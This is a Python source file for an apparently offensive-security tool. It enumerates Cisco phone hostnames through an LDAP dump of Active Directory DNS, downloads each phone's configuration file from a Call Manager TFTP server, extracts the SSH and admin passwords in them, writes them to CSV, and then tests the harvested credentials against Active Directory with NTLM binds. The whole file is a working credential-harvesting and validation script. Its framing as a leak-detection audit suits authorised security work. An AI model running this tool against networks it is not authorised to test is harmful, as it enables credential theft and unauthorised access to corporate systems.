#!/usr/bin/env python
####################
#
# MIT License
# 
# Copyright (c) 2019 t4
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
####################
import os
import sys
import argparse
import getpass
import re
import csv
from ldap3 import NTLM, Server, Connection, ALL, LEVEL
import dns.resolver
from builtins import str
from future.utils import itervalues, iteritems, native_str
import requests
import lxml
from bs4 import BeautifulSoup

# Global variables
credential_exclusions = ['test_user:test_password'] # Add users/password combinations to hide false positives/credentials known about 
tftp_port = '6970'

def print_m(string):
    """Function for printing general information"""
    sys.stderr.write('\033[94m[-]\033[0m %s\n' % (string))


def print_o(string):
    """Function for printing success messages"""
    sys.stderr.write('\033[92m[+]\033[0m %s\n' % (string))


def print_f(string):
    """Function for printing error or warning messages (and when creds are found, because they shouldn't be)"""
    sys.stderr.write('\033[91m[!]\033[0m %s\n' % (string))

def server_check(hostname, verbose=False):
    """Checks if the LDAP server provided is connectable to
    
    Parameters
    ----------
    hostname: str
        Defines the LDAP server hostname to test the connection to, and can either be an IP address or a FQDN
    verbose: boolean (defaults to False)
        The function prints the error message if verbosity is set to True

    Returns
    -------
    boolean
        Returns True if connection succeeds and False if connection fails
    """
    try:
        Server(hostname, get_info=ALL, connect_timeout=10)
        return True
    except Exception as e:
        if verbose:
            print(e)
        return False

def check_creds(domain, creds, hostname, verbose=False):
    """Checks validity of credentials scraped from phone config files against Active Directory

    Parameters
    ----------
    domain: str
        The domain to be used when authenticating to AD with the users
    creds: list
        The list is to be made up of dictionary elements, each dictionary containing the index values 'username' and 'password'.
    hostname: str
        Contains the hostname of the LDAP server, generally this is the same as a DC
    verbose: boolean
        The function prints information relating to the LDAP connection if verbosity is set to True
    """
    authentication = NTLM # Sets authentication type when connecting to the LDAP server

    uniq_creds = set() # Made a set to avoid duplication of records
    for cred in creds:
        uniq_creds.add(cred['username'] + ':' + cred['password'])

    for i in uniq_creds:
        # Preparing the credentials for authentication
        print_m('Testing ' + i)
        username = domain + '\\' + i.split(':', 1)[0]
        password = i.split(':', 1)[1]

        # Setting up the LDAP connection
        s = Server(hostname, get_info=ALL)
        if verbose:
            print_m('Connecting to host...')
        c = Connection(s, user=username, password=password, authentication=authentication, auto_referrals=False)
        
        # Perform the Bind operation
        if verbose:
            print_m('Binding to host')
        if not c.bind():
            print_f('Credentials invalid! You may want to check if they work in CUCM locally.')
        else:
            print_o('Valid AD credentials found!')

def check_cucm_access(cucm_server, verbose=False):
    """Checks access to the CUCM TFTP server

    It checks this by attempting to download the file XMLDefault.cnf.xml from the 
    TFTP server and checks if it contains the string '<default', which is what it begins
    with in the TFTP server of CUCM (Call Manager).

    If, for some reason, the file does not exist on the TFTP server or does not contain
    the string '<default', this function will return False and this may be a false positive.
    If you find yourself in this circumstance just modify the code to return True in the
    beginning of the function.

    Parameters
    ----------
    domain: str
        The domain to be used when authenticating to AD with the users
    creds: list
        The list is to be made up of dictionary elements, each dictionary containing the index values 'username' and 'password'.
    hostname: str
        Contains the hostname of the LDAP server, generally this is the same as a DC
    verbose: boolean
        The function prints information relating to the LDAP connection if verbosity is set to True
        Defaults to False if argument is not passed

    Returns
    -------
    boolean
        Returns True if the file was downloaded and had a string match.
        Returns False in all other circumstances.
    """
    url = 'http://' + str(cucm_server) + ':' + tftp_port + '/XMLDefault.cnf.xml'
    try:
        cucm_response = requests.get(url, timeout=10).content
        if '<default' in str(cucm_response) or '<Default' in str(cucm_response):
            return True
        else:
            return False
    except Exception as e:
        print('TFTP connection error: ' + str(e))
        return False

def find_creds(cucm_server, phone_hostnames, out_dir=None, verbose=False):
    """Scrapes phone config files for credentials

    Parameters
    ----------
    cucm_server: str
        The IP (or hostname) of the CUCM (Call Manager) server
    phone_hostnames: list
        The list of phone hostnames (such as ['SEPF4CF21AB902F', 'SEPF4CF21AB9039'])
    verbose: boolean
        The function prints announces it is checking each configuration file if this is set to True
        Defaults to False if argument is not passed

    Returns
    -------
    list
        Returns a list containg the credentials found in the phone config files.
        The list is made up of dictionary elements, each of which are in the format of:
        {'phone': phone_hosntame, 'username': username_found, 'password': password_found}
    """
    creds = []

    if check_cucm_access(cucm_server, verbose):
        base_url = 'http://' + str(cucm_server) + ':' + tftp_port + '/'
        
        for phone in phone_hostnames:
            if verbose:
                print_o('Checking ' + str(phone))
            
            r = requests.get(base_url + str(phone) + '.cnf.xml')
            content = r.content

            # Store files in outdir if provided
            if out_dir is not None:
                config_file = open(out_dir + '/' + phone + '.cnf.xml', 'w')
                config_file.write(content.decode())
                config_file.close

            content = content.decode().replace('\n', '').replace('\r','')
            soup_content = BeautifulSoup(content, features='lxml')

            # Check for password leakage in the sshPassword tag
            ssh_password = soup_content.find_all('sshpassword')
            if len(ssh_password) > 0:
                ssh_password = str(ssh_password[0].text)
                if len(ssh_password) > 0:
                    ssh_user = str(soup_content.find_all('sshuserid')[0].text)
                    # Exclude the credentials if they can be found in credential_exclusions
                    if not str(ssh_user + ':' + ssh_password) in credential_exclusions:
                        print_f('There seems to be password leakage in ' + str(phone) + ': ' + ssh_user + ':' + ssh_password)
                        creds.append({'phone_hostname': str(phone), 'username': ssh_user, 'password': ssh_password})

            # Check for password leakage in the adminPassword tag
            admin_password = soup_content.find_all('adminpassword')
            if len(admin_password) > 0:
                admin_password = str(admin_password[0].text)
                if len(admin_password) > 0:
                    admin_user = ''

                    # Some phones seem to have the adminPassword username in the adminUserID tag and others in the loadServer tag
                    admin_user_id = soup_content.find_all('adminuserid')
                    load_server = soup_content.find_all('loadserver')
                
                    if len(admin_user_id) > 0:
                        admin_user = str(admin_user_id[0].text)
                    elif len(load_server) > 0:
                        admin_user = str(load_server[0].text)

                    # Exclude the credentials if they can be found in credential_exclusions
                    if not str(admin_user + ':' + admin_password) in credential_exclusions:
                        print_f('There seems to be password leakage in ' + str(phone) + ': ' + admin_user + ':' + admin_password)
                        creds.append({'phone_hostname': str(phone), 'username': admin_user, 'password': admin_password})

        return creds
    else:
        exit_from_here('Error accessing the TFTP server on the provided CUCM server address. Please make sure you can access it.')


def ldap2domain(ldap):
    """Retrieves the current domain/zone from the LDAP server

    Parameters
    ----------
    ldap: str
        The argument passed is a string containg the domainroot of the LDAP server connected to

    Returns
    -------
    str
        Returns the zone name from the dnsroot passed to the function
    """
    return re.sub(',DC=', '.', ldap[ldap.find('DC='):], flags=re.I)[3:]

def exit_from_here(error_message=None):
    """Exits out of the program because of an error or an issue with a passed argument

    Parameters
    ----------
    error_message: str
        Contains the error message to be printed
    """
    if error_message is not None:
        print_f(error_message)
    print_f('Exiting..')
    sys.exit(1)

def main():
    """Searches through Cisco phone configuration files for credentials
    
    DNS entries are dumped through LDAP (unless a list of phone hostnames are provided),
    as described in Dirk-jan's blog: https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/
    The DNS entries are filtered for Cisco phones (DNS entries beginning with SEP).

    Phone configurations for each of the phones are then checked for credentials that have been leaked
    through an issue caused by some browsers automatically plugging in user credentials into the
    SSH/admin credential fields of phones. 
    """
    print("""\
_________ _______           _        _______  _______  _       
\__   __/(  ____ \|\     /|( \      (  ____ \(  ___  )| \    /\\
   ) (   | (    \/| )   ( || (      | (    \/| (   ) ||  \  / /
   | |   | |      | |   | || |      | (__    | (___) ||  (_/ / 
   | |   | |      | |   | || |      |  __)   |  ___  ||   _ (  
   | |   | |      | |   | || |      | (      | (   ) ||  ( \ \ 
___) (___| (____/\| (___) || (____/\| (____/\| )   ( ||  /  \ \\
\_______/(_______/(_______)(_______/(_______/|/     \||_/    \/.py

""")

    
    parser = argparse.ArgumentParser(
        description='Search CUCM (Call Manager) for leaked credentials in phone configuration files. This tool uses a DNS zone dump (through LDAP) if no list is provided.')
    parser._optionals.title = 'Main options'
    parser._positionals.title = 'Required options'

    # Main parameters
    parser.add_argument('host', type=native_str, metavar='HOSTNAME', help='Hostname/ip or ldap://host:port connection string to connect to')
    parser.add_argument('-u', '--user', type=native_str,metavar='USERNAME', help='DOMAIN\\username for authentication')
    parser.add_argument('-p', '--password', type=native_str,metavar='PASSWORD', help='Password or LM:NTLM hash, will prompt if not specified')
    parser.add_argument('-c', '--cucm-server', help='CUCM (Call Manager) IP/hostname', required=True)
    parser.add_argument('-l', '--list', help='File containg a list of phone hostnames')
    parser.add_argument('-s', '--save', help='Save leaked credentials to file (in CSV format)')
    parser.add_argument('-nA', '--no-authentication', action='store_true', help='Do not attempt to authenticate with the users found')
    parser.add_argument('-O', '--out-dir', help='Save dumped phone configuration files to specified directory')
    parser.add_argument('-v', '--verbose', action='store_true', help='Show verbose information')
    parser.add_argument('-z', '--zone', help='DNS zone to search in (if different to the current domain)')

    args = parser.parse_args()

    if args.user is None and args.list is None:
        exit_from_here('If you do not provide a list of phone hostnames (-l), you must provide AD credentials to dump DNS entries through LDAP')

    # Check if provided LDAP server is connectable to
    if not server_check(args.host, args.verbose):
        exit_from_here('Attempt to connect to the LDAP server (host) failed.')
    
    # Check if provided Call Manager TFTP server is connectable to 
    if args.cucm_server is not None:
        if not check_cucm_access(args.cucm_server, args.verbose):
            exit_from_here('Error accessing the TFTP server on the provided CUCM server address. Please make sure you can access it (' + str(args.cucm_server) + ':' + tftp_port + ').')
    else:
        exit_from_here('Please provide the IP address of the CUCM server')

    # Make output directory if it doesn't exist
    if args.out_dir is not None and not os.path.exists(args.out_dir):
        os.mkdir(args.out_dir)

    # If list isn't provided, use LDAP to dump DNS records for phones
    if args.list is None:
        # Prompt for password if not set
        authentication = None
        if args.user is not None:
            authentication = NTLM
            if not '\\' in args.user:
                exit_from_here('Username must include a domain, use: DOMAIN\\username')
            if args.password is None:
                args.password = getpass.getpass()

        # Define the server and the connection
        s = Server(args.host, get_info=ALL)
        print_m('Connecting to host...')
        c = Connection(s, user=args.user, password=args.password, authentication=authentication, auto_referrals=False)
        print_m('Binding to host')
        
        # Perform the Bind operation
        if not c.bind():
            print_f('Could not bind with specified credentials')
            exit_from_here('LDAP Server response: ' + str(c.result))
        
        print_o('Bind OK')

        # Extract domain and DNS roots from the response
        domainroot = s.info.other['defaultNamingContext'][0]
        dnsroot = 'CN=MicrosoftDNS,DC=DomainDnsZones,%s' % domainroot

        if args.zone:
            zone = args.zone
        else:
            # Default to current domain
            zone = ldap2domain(domainroot)

        # Perform LDAP query for DNS records
        searchtarget = 'DC=%s,%s' % (zone, dnsroot)
        print_m('Querying zone for records')
        c.extend.standard.paged_search(searchtarget, '(objectClass=*)', search_scope=LEVEL, attributes=['dnsRecord','dNSTombstoned','name'], paged_size=500, generator=False)

        phone_hostnames = []

        for targetentry in c.response:
            if not targetentry['attributes']['name']:
                # No permission to view details of those records (hidden records)
                recordname = targetentry['dn'][3:targetentry['dn'].index(searchtarget)-1]
                if recordname.startswith('SEP'):
                    phone_hostnames.append(recordname)
            else:
                recordname = targetentry['attributes']['name']
                if recordname.startswith('SEP'):
                    phone_hostnames.append(recordname)
    else:
        # Populate phone_hostnames with the hostnames passed in the file
        phone_hostnames = []
        with open(args.list) as SEPList:
            for line in SEPList:
                phone_hostnames.append(line.strip('\n').strip('\r'))

    print_o('Found %d SEP phone records' % len(phone_hostnames))

    print_m('Scanning phone config files for credentials')
    creds = find_creds(args.cucm_server, phone_hostnames, args.out_dir, verbose=args.verbose)

    # Save a copy of the leaked credentials
    if args.save is not None:
        columns = ['phone_hostname', 'username', 'password']
        try:
            with open(args.save, 'w') as filename:
                writer = csv.DictWriter(filename, fieldnames=columns)
                writer.writeheader()
                for leakage in creds:
                    writer.writerow(leakage)
        except Exception as e:
            print_f('Error when trying to save credentials to file')
            print(e)
            exit_from_here()
    print_o(str(len(creds)) + ' credentials found leaked in phone configuration files')

    if args.no_authentication:     
        sys.exit(0)

    domain = ''

    if args.user is not None:
        domain = args.user.split('\\')[0]
    else:
        domain = str(input('Please enter the domain to be used for authentication: '))
    
    check_creds(domain, creds, args.host, args.verbose)

if __name__ == '__main__':
    main()
